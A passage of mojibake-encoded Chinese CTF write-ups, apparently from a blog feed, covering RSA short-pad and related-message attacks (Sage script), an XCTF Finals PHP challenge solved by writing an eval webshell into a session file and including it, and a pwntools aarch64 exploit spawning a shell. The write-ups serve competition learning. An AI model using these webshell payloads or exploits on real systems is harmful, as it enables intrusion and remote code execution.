<code>ç»„æ•°-1</code>ï¼Œå¦‚æœå°‘ç”¨ä¸€äº›ç»„ï¼Œå¯èƒ½ä¼šé™ä½å­—å…¸é€‰æ‹©çš„éš¾åº¦ï¼›åˆæˆ–è€…å¯ä»¥å¤šç”¨æ›´å¤šçš„ç»„ï¼Œæ¯”å¦‚ç¬¬ä¸€ç»„çš„ç¬¬ 1 ä½å’Œå…¶ä»–å„ç»„éƒ½è¿›è¡Œçˆ†ç ´ï¼Œä½¿ç”¨å°½å¯èƒ½å¤šçš„ç»„è¿›è¡Œå–äº¤é›†ï¼Œè®©æ¡ä»¶æ›´ä¸ºè‹›åˆ»ï¼Œé‚£ä¹ˆå°±å¯ä»¥è®©å­—å…¸å¤§ä¸€äº›äº†ï¼Œè¿™äº›æƒ³æ³•éƒ½å¯ä»¥è¯•ä¸€è¯•ã€‚</p><p>èµ›åçœ‹å¸ˆå‚…ä»¬çš„æ€è·¯ï¼Œå¥½åƒæ²¡æœ‰ä¸æˆ‘æœ‰ç±»ä¼¼æ€è·¯çš„â€¦ å¤§ä½“åˆ†ä¸ºè¿™ä¸¤ç§ï¼š</p><ol><li>é€šè¿‡è¯é¢‘åˆ†æç»“åˆçˆ†å‡ºçš„ keyï¼Œä¸€ç‚¹ç‚¹çŒœæµ‹çœŸæ­£çš„ keyï¼›</li><li>é€šè¿‡ <code>xortool</code>å·¥å…·è®¡ç®—å‡ºæ¨¡ç³Šçš„ keyï¼Œè§£å¯†å‡ºæ˜æ–‡çš„å‡ ä¸ªå•è¯ï¼Œç„¶åå»æœç´ å‘ç°æ˜¯æ³°æˆˆå°”çš„ã€Šç”Ÿå¦‚å¤èŠ±ã€‹ï¼Œè¿˜åŸå‡ºå®Œå®Œæ•´æ•´çš„ä¸€ç»„æ˜æ–‡ï¼Œåˆ©ç”¨è¿™ 21 ä¸ªå­—ç¬¦çš„æ˜æ–‡ä¸å¯†æ–‡å¼‚æˆ–å¾—åˆ° keyã€‚</li></ol><p>å…³äºç ´è§£å¼‚æˆ–åŠ å¯†ï¼Œè´´ä¸Šå‡ ä¸ªé“¾æ¥ï¼š</p><ol><li><a href="https://ehsandev.com/pico2014/cryptography/repeated_xor.html">https://ehsandev.com/pico2014/cryptography/repeated_xor.html</a></li><li><a href="https://findneo.github.io/171005NuptVigenereWP/">https://findneo.github.io/171005NuptVigenereWP/</a></li><li><a href="https://github.com/hellman/xortool">https://github.com/hellman/xortool</a></li></ol><p>æœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥æ·±å…¥ç ”ç©¶ã€‚</p><h3 id="xor-rsa"><a href="#xor-rsa" class="headerlink" title="xor?rsa"></a>xor?rsa</h3><p>ä¸¤æ®µæ˜æ–‡çš„å‰ <code>1024-40</code> ä½ç›¸åŒï¼Œå 40 ä½ä¸åŒï¼Œå…¸å‹çš„ RSA padding short æ”»å‡»ã€‚</p><p>é¦–å…ˆä½¿ç”¨ <code>Coppersmithâ€™s Short Pad Attack</code>  æ¥è·å¾—ä¸¤æ®µæ˜æ–‡çš„å·®å€¼ï¼Œç„¶åå†åˆ©ç”¨ <code>Related Message Attack</code>æ¢å¤æ˜æ–‡ï¼Œä½¿ç”¨ sage è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.5</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   </span><br><span class="line">    n =</span><br><span class="line">    c1 =</span><br><span class="line">    c2 = </span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;difference of two messages is %d&quot;</span> % diff</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> m1</span><br><span class="line">    <span class="built_in">print</span> m1 + diff</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(m1,e,n)==c1)</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">pow</span>(m1 + diff,e,n)==c2)</span><br></pre></td></tr></table></figure><p>åœ¨<a href="https://sagecell.sagemath.org/">https://sagecell.sagemath.org/</a> ä¸Šè¿è¡Œï¼ŒæŠŠç»“æœå‘è¿‡å»å°±å¯ä»¥å¾—åˆ° flagã€‚</p><p>ä¹Ÿå¯ä»¥é‡‡ç”¨ä¸‹é¢çš„è„šæœ¬æ±‚è§£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ValarDragon&#x2F;CTF-Crypto&#x2F;blob&#x2F;master&#x2F;RSA&#x2F;FranklinReiter.sage</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 XCTF FINALS</title>
      <link href="/2018/11/05/2018-XCTF-FINALS/"/>
      <url>/2018/11/05/2018-XCTF-FINALS/</url>
      
        <content type="html"><![CDATA[<p>æœ‰å¹¸å‚åŠ äº† 2018 XCTF FINALSï¼Œçº¿ä¸‹é•¿äº†ä¸å°‘è§è¯†ã€‚å›å­¦æ ¡å°±æ‰“äº†ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨ç«èµ›ï¼Œç°åœ¨è®°å½•ä¸€ä¸‹ XCTF FINALSã€‚</p><p>æ”»é˜²èµ›å››é“ pwnï¼ŒWeb ç‹—ä¹Ÿåªèƒ½æ‰“æ‰“è§£é¢˜è¿™æ ·å­â€¦</p><p>è§£é¢˜æœ‰ 5 é“ Miscï¼Œ2 é“ Web å’Œ 4 é“ pwnï¼Œå’Œé˜Ÿå‹åšå‡ºäº†ä¸¤é“ Misc ï¼Œä¸€é“ Web å’Œä¸¤é“ pwnã€‚ä¸å¾—ä¸è¯´è¿™æ¬¡çš„ Misc å¾ˆæ–°é¢–ï¼ŒåŠ å…¥äº†ç¡¬ä»¶çš„æŒ‘æˆ˜ï¼Œæœ‰ä¸¤é“é¢˜æ˜¯é€šè¿‡ç»™çš„è·¯ç”±å™¨æ¥æ‹¿ flagï¼Œè¿˜æœ‰æ ¸å¼¹é¥æ§å™¨å¯†ç å’Œæ— çº¿é¢‘è°±çš„é¢˜ï¼Œè‡ªå·±å¤ªèœäº†ï¼Œå­¦ä¸åŠ¨â€¦</p><a id="more"></a><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h4><p>è¿™ä¸ªé¢˜åšçš„æ—¶å€™å¥½åƒè¢«äººæ…å±äº†ï¼Œæ€è·¯å¾ˆæ¸…æ™°ä½†æ˜¯æ‰“ä¸æˆåŠŸã€‚ã€‚ã€‚åæ¥æ‰¾éº¦é¦™å¸ˆå‚…è¦äº† dockerï¼Œå¤ç°äº†ä¸€æ³¢å°±æˆäº†emmmmmm æœ‰ç‚¹å¯æƒœã€‚</p><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html:/tmp&#x27;</span>);</span><br><span class="line">    $file = <span class="string">&#x27;function.php&#x27;</span>;</span><br><span class="line">    $func = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;function&#x27;</span>])?$_GET[<span class="string">&#x27;function&#x27;</span>]:<span class="string">&#x27;filters&#x27;</span>; </span><br><span class="line">    call_user_func($func,$_GET);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        header(<span class="string">&#x27;location:admin.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é™å®šäº†åŒ…å«çš„ç›®å½•ï¼Œæœ‰å›è°ƒå‡½æ•°å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œsession çš„å†…å®¹å¯ä»¥é€šè¿‡ name æ§åˆ¶ã€‚</p><p>å¼€å§‹æ²¡æœ‰ get åˆ°å‡ºé¢˜äººçš„ç‚¹ï¼Œè¿™ç§æ²¡æœ‰ç»™ä»»ä½• flag ä¿¡æ¯çš„é¢˜åº”è¯¥å°±æ˜¯ getshelläº†ã€‚å¼€å§‹ä¸€ç›´çº ç»“äºå›è°ƒå‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°ç»„å¦‚ä½•åˆ©ç”¨ï¼Œåæ¥æ‰çŸ¥é“è¿™ä¸ªé¢˜è€ƒç‚¹æ˜¯<code>php7 + session è·¯å¾„ + å˜é‡è¦†ç›–</code> </p><p>name å¯ä»¥æ§åˆ¶ session æ–‡ä»¶çš„å†…å®¹ï¼Œé‚£ä¹ˆè¦æŠŠé©¬å†™åˆ° session æ–‡ä»¶ä¸­å»ã€‚ç„¶è€Œ php é»˜è®¤çš„ session å­˜å‚¨å­˜å‚¨è·¯å¾„æ˜¾ç„¶ä¸åœ¨é™å®šçš„<code>/var/www/html å’Œ /tmp</code> ä¸­ï¼Œæˆ‘ä»¬æ— æ³•åŒ…å«ï¼Œä¹Ÿå°±æ— æ³•åˆ©ç”¨ã€‚</p><p>è¿™é‡Œç”¨åˆ°äº† php7 çš„ä¸€ä¸ªæ–°ç‰¹æ€§ï¼Œä» php7 å¼€å§‹ï¼Œsession_start å‡½æ•°å¯ä»¥æ¥æ”¶ä¸€ä¸ªå…³è”æ•°ç»„ï¼Œå¯ä»¥è¦†ç›– php.ini æ–‡ä»¶ä¸­çš„é»˜è®¤é…ç½®ï¼Œè¯¦ç»†å¯è§<a href="http://php.net/manual/zh/function.session-start.php">å®˜æ–¹æ–‡æ¡£</a> ã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-61b0a41e27b844f1.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ä¿®æ”¹ session çš„å­˜æ”¾ä½ç½®ï¼Œpayload:</p><p><code>?function=sesson_start&amp;save_path=/tmp</code></p><p>åŒæ—¶ post name å‚æ•°ï¼ŒæŠŠé©¬å†™å…¥ session æ–‡ä»¶ï¼š</p><p><code>name=&lt;?php @eval($_POST[&#39;gml&#39;]);?&gt;</code></p><p>è¿™æ ·å°±æŠŠé©¬å†™å…¥äº† session æ–‡ä»¶é‡Œã€‚ï¼ˆæ³¨æ„ï¼Œphp.ini ä¸­è®¾ç½® session æ–‡ä»¶å­˜å‚¨ä½ç½®çš„å˜é‡æ˜¯ session.save_pathï¼Œpayload é‡Œä¸éœ€è¦åŠ  <code>session.</code> åŠ çš„è¯ . ä¹Ÿä¼šè¢«æ›¿æ¢æˆ _ï¼Œå› ä¸º php è§„å®šå˜é‡åæ˜¯ä¸å¯ä»¥å¸¦ <code>.</code>  çš„ï¼Œå‘äº†æˆ‘å¥½ä¹…ï¼‰</p><p>é‚£ä¹ˆå¦‚ä½•åŒ…å«æˆ‘ä»¬å†™çš„é©¬å‘¢ï¼Ÿ ä»£ç é‡Œæœ‰ä¸ª <code>include($file);</code> ï¼Œè¿™é‡Œéœ€è¦é€šè¿‡ extract å‡½æ•°è¦†ç›– file å˜é‡ï¼ŒåŒ…å«æˆ‘ä»¬å†™çš„é©¬ï¼Œsession æ–‡ä»¶çš„å‘½åä¸º<code>sess_PHPSESSID</code> æ‰€ä»¥é€šè¿‡ä¸‹é¢çš„ payload æ‰§è¡Œä»£ç ï¼š</p><p><code>?function=extract&amp;file=/tmp/sess_bl0ur0r6ni8ioq5mqggr3sh5h5</code></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-04787bf7b76d4d90.png" alt="image.png"></p><p>å‘ç°æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-4c3c00d8e6e322c4.png" alt="image.png"></p><p>ç„¶åå°±æ˜¯è¯» flag äº†ï¼Œæ‹¿èšå‰‘è¿ä¸€ä¸‹ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-01782225a0d0feb8.png" alt="image.png"></p><h4 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h4><p>è¿™é“é¢˜æ˜¯ä¹‹å‰ 2018 HITB GSEC FINAL çš„ AWD ä¸€é“é¢˜çš„ç¯å¢ƒåšäº†ä¸€äº›ä¿®æ”¹ï¼Œå½“æ—¶æˆ‘ä¹Ÿå»äº†ç°åœºï¼Œè™½ç„¶æ²¡æœ‰æ‰“ AWD (æ‰“çš„è§£é¢˜)ä½†æ˜¯å¬äº†å‡ºé¢˜å¸ˆå‚… RicterZ åœ¨æ–°åŠ å¡å›½ç«‹å¤§å­¦çš„å‡ºé¢˜åˆ†äº«ï¼Œç…§ç€å·®ä¸å¤šç®—æ˜¯ wp çš„ ppt å¤ç°é¢˜ç›®å¯è¿˜è¡Œâ€¦</p><p>è¿™ä¸ªé¢˜æ¯”è¾ƒéº»çƒ¦ï¼Œæºç æ³„éœ²-&gt; ZENDè§£å¯† -&gt; sql æ³¨å…¥-&gt; ä¼ªé€  cookie è¿›ç®¡ç†å‘˜ -&gt; æ§åˆ¶ curl çš„å†…å®¹å†™ shellï¼Œå…·ä½“å¯ä»¥å‚è€ƒ De1ta çš„ Web å¤§å¸ˆå‚…çš„ <a href="https://xz.aliyun.com/t/3158#toc-2">wp</a></p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Budge1"><a href="#Budge1" class="headerlink" title="Budge1"></a>Budge1</h4><p>Budge1 å’Œ Budge2 æ˜¯éœ€è¦æ ¹æ®ç»™çš„è·¯ç”±å™¨æ‹¿ flagã€‚</p><p>Budge1 ç›¸å¯¹ç®€å•ï¼ŒBudge2 æ˜¯æ‹¿åˆ°ç®¡ç†å‘˜çš„ shellï¼Œç™»è¿›å»ç®¡ç†å‘˜é¡µé¢çœ‹ flagï¼Œè¿˜è¦ç„Šæ¥çš„æ“ä½œï¼Œåªå¯æƒœå½“æ—¶åšçš„æ—¶å€™æ²¡æœ‰ç¡¬ä»¶äº†ã€‚ã€‚ã€‚</p><p>Budge1 è¸©äº†å‘ï¼Œé¢˜ç›®æ²¡ç»™æç¤ºï¼Œè¿˜ä»¥ä¸ºè¦æŠ“åŒ…ï¼Œè¿ä¸Šç½‘çº¿åˆ†æäº†åŠå¤©æµé‡ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°ï¼Œç„¶åå‡ºé¢˜äººå‰é¢è¯´ Budge1 æ˜¯è¯»ç¯çš„ä¿¡æ¯ï¼Œæ‰å‘ç°ç¡¬ä»¶æœ‰ç¯é—ªçƒï¼Œåº”è¯¥æ˜¯äºŒè¿›åˆ¶çš„ä¿¡æ¯ã€‚ä¸¤ä¸ªç¯å¯ä»¥é—ªçƒï¼Œåˆ†åˆ«å¯¹åº” 0 å’Œ 1ï¼Œè¿èµ·æ¥ hex è§£ç æ˜¯ <code>hitb2018</code> ï¼Œç„¶åæ€ä¹ˆäº¤ä¹Ÿä¸å¯¹ï¼Œæç¤ºè¯´å„ç§ç¼–ç ï¼Œhex ç¼–ç å°±è¿‡äº†â€¦</p><h4 id="Mysterious-signals"><a href="#Mysterious-signals" class="headerlink" title="Mysterious signals"></a>Mysterious signals</h4><p>hint:æ— çº¿å°„é¢‘é¢‘è°± radio frequency spectrum </p><p>ä½¿ç”¨ Audacity å¯¼å…¥æ•°æ®ï¼ˆæ–‡ä»¶ -&gt; å¯¼å…¥ -&gt; åŸå§‹æ•°æ®ï¼‰ï¼ŒæŸ¥çœ‹é¢‘è°±ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-6be35f179f2c4d91.png" alt="image.png"></p><h3 id="æ„Ÿå—"><a href="#æ„Ÿå—" class="headerlink" title="æ„Ÿå—"></a>æ„Ÿå—</h3><p>è§è¯†äº†è®¸å¤šå›½å†…å¼ºé˜Ÿï¼ŒNu1lL çš„å¸ˆå‚…ä»¬å°±ååœ¨å¯¹é¢â€¦ è¿˜æœ‰ 0opsï¼Œå¤©æ¢ç­‰å¼ºé˜Ÿï¼Œr3kapig çš„å¸ˆå‚…ä»¬ tqlã€‚</p><p>Web ç‹—æ‰“ä¸æˆæ”»é˜²ï¼Œè‚äº†ä¸¤å¤©çš„è§£é¢˜ï¼Œç¡¬ä»¶çš„ Misc é¢˜è¿˜æ˜¯æŒºæœ‰è¶£çš„ï¼Œç¬¬ä¸€å¤©æ™šä¸Šå›å»è‚æ ¸å¼¹é¥æ§å™¨å¯†ç é‚£ä¸ª Miscï¼Œåªå¯æƒœæ²¡æ‰¾åˆ°æ­£ç¡®çš„å·¥å…·åˆ†æï¼Œä¸¤å¤©ç¡äº† 3 ä¸ªå¤šå°æ—¶ä¹Ÿæ˜¯æ¯”è¾ƒç–²æƒ«ï¼Œä¸è¿‡é…’åº—å’Œé˜Ÿå‹ä¸€èµ·è‚çš„æ„Ÿè§‰ä¹Ÿå¾ˆå¥½ï¼Œæœ‰æ—¶å€™æ¯”èµ›ç»“æœå¹¶ä¸æ˜¯æœ€é‡è¦çš„ï¼Œé‡è¦çš„æ˜¯æœ‰å’Œä½ ä¸€èµ·è‚çš„å…„å¼Ÿä»¬å’Œæœ‹å‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›é¢˜è§£</title>
      <link href="/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
      <url>/2018/11/05/%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>åˆ©ç”¨å‘¨æœ«æ‰“äº†ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›ï¼Œæœ€åæ‰“äº†ç¬¬ä¸‰ï¼Œè¿™æ¬¡çš„ Misc çœŸçš„æ˜¯éš¾ä¸Šå¤©ï¼Œé™¤äº†ç­¾åˆ°å…¶ä»–éƒ½åšä¸åŠ¨â€¦è†œä¸€æ³¢å¤æ—¦çš„å¸ˆå‚…ä»¬ã€‚æ¯”èµ›ä¸­æˆ‘æ‰“çš„æ˜¯ Crypto å’Œéƒ¨åˆ† Webï¼Œè¿™é‡Œä¹Ÿè´´äº†ä¸€äº›é˜Ÿå‹çš„ wpã€‚</p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h4><p>ç›´æ¥ base32 è§£ç ã€‚</p><a id="more"></a><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="baby-arm"><a href="#baby-arm" class="headerlink" title="baby_arm"></a>baby_arm</h4><p> arm æ¶æ„ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯æ”¹æ‰ mprotect å‡½æ•°çš„å‚æ•°ï¼Œä½¿ bss æ®µå¯æ‰§è¡Œã€‚</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;106.75.126.171&#x27;</span>, <span class="number">33865</span>)</span><br><span class="line"></span><br><span class="line">start = p64(<span class="number">0x4007D8</span>)+asm(shellcraft.aarch64.linux.sh())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Name:&#x27;</span>, start.ljust(<span class="number">512</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">padding=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">pop=<span class="number">0x4008CC</span></span><br><span class="line">lea=<span class="number">0x4008ac</span></span><br><span class="line">bss= <span class="number">0x411068</span></span><br><span class="line">payload = flat(padding, pop, <span class="number">0</span>, lea, <span class="number">0</span>, <span class="number">1</span>, bss, <span class="number">7</span>, <span class="number">0x1000</span>, <span class="number">0</span>, p64(<span class="number">0x411070</span>)*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="rsaaaaa"><a href="#rsaaaaa" class="headerlink" title="rsaaaaa"></a>rsaaaaa</h4><p>è¿™é“é¢˜æœ‰ä¸¤ä¸ªç‚¹ï¼Œç¬¬ä¸€ä¸ªç‚¹æ˜¯ RSA ä¸­ç»™å®š m å’Œ cï¼Œæä¾› d å’Œ nï¼Œè¿™é‡Œè„šæœ¬éšæœºç”Ÿæˆçš„å…¬ç§é’¥ï¼Œæƒ³è¦ç›´æ¥è·å–åŸºæœ¬ä¸å¯èƒ½ï¼Œæˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨è„šæœ¬åªåˆ¤æ–­äº†ä¸€ä¸ªç­‰å¼ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-3e19ce4d795f6163.png" alt="image.png"></p><p>åªè¦æ»¡è¶³ <code>pow(c,D,N) == m</code> å³å¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è‡ªå·±é€‰å®šä¸€ä¸ª d,ç„¶åä»¤ <code>n=pow(c,d)-m</code> å³å¯ã€‚</p><p>ç¬¬äºŒä¸ªç‚¹æ˜¯ä¸‹é¢è¿™æ®µä»£ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f6d2cc159b224ad6.png" alt="image.png"></p><p>è¿™é‡Œç»™äº†æˆ‘ä»¬ä¸€æ¬¡è§£å¯†çš„æœºä¼šï¼Œä½†ä¸å…è®¸è§£å¯†æ˜æ–‡ï¼Œè¿™ä¸ªè€ƒç‚¹åœ¨ä¹‹å‰çš„ suctf å‡ºè¿‡ï¼Œæ€è·¯æ˜¯è®©æœåŠ¡å™¨è§£å¯†<code>(c*pow(2,e,n))%n</code> ï¼Œè¿™æ ·å¾—åˆ°çš„æ˜æ–‡æ˜¯ <code>2*m</code>ï¼Œé™¤2å³å¯ã€‚</p><p>è„šæœ¬å¦‚ä¸‹ï¼šï¼ˆæ‹¿ socket å†™çš„ï¼Œæ¯”è¾ƒä¸‘ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 